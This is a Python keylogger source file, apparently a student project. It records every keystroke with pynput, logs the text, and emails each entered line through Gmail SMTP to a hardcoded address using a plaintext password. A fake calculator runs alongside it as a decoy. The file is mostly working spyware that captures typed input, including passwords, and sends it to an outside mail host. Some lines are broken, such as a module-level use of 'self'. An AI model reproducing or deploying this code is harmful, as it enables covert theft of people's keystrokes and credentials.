from pynput import keyboard
import logging
import sys

import threading

# Import smtplib for the actual sending function
import smtplib
from datetime import datetime
# Import the email modules we'll need
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
# from email import MIMEText

from calculator import *

# not used yet
class KeyLogger:


    log_dir = r"C:/Users/sarao/OneDrive/Dokument/KeyLogger_test/"
    logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(message)s', filemode='w')
    def __init__(self):
        self.listener = None
        self.spoof_program = None

    def init(self):
        self.messageArray = []
        self.outputMessage = ""
        print("running")

        # define which functions to call on press or release
        with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release) as listener:
            listener.join()

        self.listener.start()


    def on_press(self, key):
        abc = str(key)
        #abc is char 'a' or 'key.backspace' f.e
        try:
            print('alphanumeric key {0} pressed'.format(key.char))
            # self.messageArray is an array of strings ['s','t','g'] f.e
            self.messageArray.append(abc)
        except AttributeError:
            # Pressed space, enter, backspace etc...
            if(abc == 'Key.space'):
                abc.capitalize()
            if(abc == 'Key.space'):
                self.messageArray.append(abc)

            if (abc == 'Key.backspace'):
                if (len(self.messageArray) > 0):
                    deletedChar = self.messageArray[-1]
                    print('deleted', deletedChar)
                    logging.info('deleted character: {}'.format(deletedChar))
                    logging.info('New line: {0}'.format(self.messageArray))
                    self.messageArray = self.messageArray[:-1]
                else:

                    self.outputMessage = ""

            if abc == 'Key.escape':
                self.spoof_program.quit(self)
                sys.exit()

            if(abc == 'Key.enter'):
                #logging.info('{0} pressed'.format(key))
                # self.outputMessage is a string which will be converted when pressing enter
                self.outputMessage = self.concatenate(self.messageArray)
                #print(self.outputMessage)
                logging.info(self.outputMessage)
                self.messageArray = []

    # concatenate() returns a single concatenated string
    def concatenate(self, s):
        print('concatenating...')
        concatenated_string = ""
        # traverse in the string
        for x in s:
            # remove ', Enter, Space and Backspace
            x = x.replace("'", "").replace("Key.enter", "").replace("Key.space", " ").replace("Key.backspace", "")
            concatenated_string += x

        self.send_email(concatenated_string)

        # return string
        return concatenated_string

    def on_release(self, key):
        print('{0} released'.format(key))
        if key == keyboard.Key.esc:
            # Stop listener
            return False

    def send_email(self, text):

      dateTimeString = datetime.now().strftime("%d-%b-%Y (%H:%M:%S)")

      fromemail = "keyloggertnm031@gmail.com"
      toemail = "keyloggertnm031@gmail.com"

      msg = MIMEMultipart()
      msg['From'] = fromemail
      msg['To'] = toemail
      msg['Subject'] = "Keylogged at " + dateTimeString

      body = text
      msg.attach(MIMEText(body, 'plain'))

      server = smtplib.SMTP('smtp.gmail.com', 587)
      server.starttls()
      server.login(msg['From'], "keyloggerTNM031")
      text = msg.as_string()
      server.sendmail(msg['From'], msg['To'], text)
      server.quit()

      print("email sent")


def main_program():
    keylogger = KeyLogger()
    keylogger.init()

# start thread so both programs can be runned at the same time
x = threading.Thread(target=main_program) #, args=(1,)
x.start()

self.spoof_program = Calculator()
